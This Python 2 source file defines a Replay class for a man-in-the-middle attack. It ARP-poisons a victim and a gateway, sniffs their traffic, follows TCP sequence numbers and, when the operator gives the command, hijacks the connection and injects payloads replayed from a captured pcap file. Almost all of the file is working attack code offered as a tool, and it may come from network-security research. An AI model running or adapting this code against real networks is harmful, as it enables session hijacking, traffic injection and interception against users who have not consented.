__author__ = 'Nicholas Rodofile'

from Injection import *

class Replay(Injection):
    def __init__(self, victim=None, gateway=None, attack_function=None, verbose=1,
                 pkt_count=1, interface_selected=None, replayable_pcap=None):

        Injection.__init__(self, victim, gateway, attack_function, verbose,
                           pkt_count, interface_selected)
        self.to_gateway = []
        self.to_victim = []
        self.replayable_pcap = replayable_pcap
        self.process_replayable(replayable_pcap)

    def process_replayable(self, pcapfile):
        pcap = rdpcap(pcapfile)
        self.to_gateway = []
        self.to_victim = []
        for p in pcap:
            if p.haslayer(TCP):
                if p[TCP].flags == PSH+ACK:
                    if p[IP].dst == self.gateway.ip_address:
                        self.to_gateway.append(p)

                    elif p[IP].dst == self.victim.ip_address:
                        self.to_victim.append(p)

    def replayer(self):
        spoofer = self.gateway.spoofer
        num = 0
        while self.gateway.sequence <= 0 or self.victim.sequence <= 0:
            # wait for sequence numbers
            pass
        print "Connection is now Compromised"
        while not self.hijacked:
            highjacked_input = str(raw_input("Enter \'h\' to High-jack connection\n"))
            if highjacked_input == "h":
                self.hijacked = True
        print "Connection is now High-jacked, Replaying pcap"

        for p in self.to_gateway:
            spoofer.inject(p[Raw])
            sleep(3)

    def process_packet(self, pkt):
        if self.hijacked is True:
            spoofer_gw = self.gateway.spoofer
            spoofer_vt = self.victim.spoofer
            if pkt.haslayer(Ether):
                if pkt.haslayer(TCP):
                    if (pkt[TCP].seq == spoofer_gw.acknowledgement) \
                            and spoofer_gw.injected \
                            and pkt[Ether].src == self.gateway.mac_address:
                        spoofer_gw.ack_injection(pkt)
                        return

                    if pkt[Ether].dst == self.attacker.mac_address:
                        if pkt[Ether].src == self.gateway.mac_address:
                            if pkt[TCP].flags == 24:
                                spoofer_vt.gateway_responder(pkt)
                                return
                            print "DROPPING >> ", pkt.summary()
                            spoofer_vt.sequence_conf(pkt)
                            return

                        elif pkt[Ether].src == self.victim.mac_address:
                            spoofer_gw.sequence_conf(pkt)

                        else:
                            self.error("Forward Error!: ", pkt.summary())
                            return
        else:
            self.forward_packet(pkt)

    def start(self):
        self.attacking = True
        self.init_spoofing()
        filter_str = self.get_sniffing_filter()
        arp_poisoning_thread = Thread(target=self.arp_poisoning)
        arp_poisoning_thread.start()
        replayer = Thread(target=self.replayer)
        replayer.daemon = True
        replayer.start()
        if self.attacking:
            self.show_verbose(str="Filter: " + filter_str)
            self.show_verbose(str="Starting MITM and Replay attack")
            sniffed = sniff(prn=self.process_packet, filter=filter_str, count=int(self.pkt_count))
            self.save_capture(sniffed, "_Replay_")
            self.show_verbose(str="Finished MITM and Replay attack")
        self.attacking = False
        replayer.join(1)
        arp_poisoning_thread.join()


def Replay_conf(interface='eth0', verbose=1, pkt_count=30):
    gateway, victim = config_nodes(interface=interface)
    return Replay(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)